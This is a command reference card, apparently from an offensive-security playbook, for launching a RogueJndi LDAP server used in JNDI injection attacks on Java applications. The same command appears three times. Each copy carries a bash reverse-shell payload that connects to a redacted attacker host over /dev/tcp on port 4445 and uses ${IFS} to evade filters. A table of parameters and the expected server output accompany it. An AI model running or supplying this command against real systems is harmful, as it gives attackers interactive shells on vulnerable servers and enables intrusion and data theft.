---
id: cmd-start-roguejndi
data: >-
  java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c
  bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"
tags:
  - jndi
  - ldap
type: command
output: >-
  RogueJndi server running and ready to respond to LDAP queries with the gadget
  chain
executor: bash
platforms:
  - Linux
  - Java
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.587Z'
verified: false
validated: true
submitted: true
---
# start-roguejndi-server

## Command

```bash
java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"
```

## Description

Starts the RogueJndi LDAP server with a reverse shell payload for deserialization exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --hostname | Attacker's redacted hostname for LDAP responses | Yes |
| -c | Reverse shell command payload | Yes |

## Examples

### Basic Usage

```bash
java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"
```

### Advanced Usage

Add --commandPort for custom LDAP port.

## Expected Output

"RogueJndi started a LDAP server on 0.0.0.0:1389 using any request on port 11111".

## Related

- [[procedures/Start-Rogue-JNDI-LDAP-Server]]
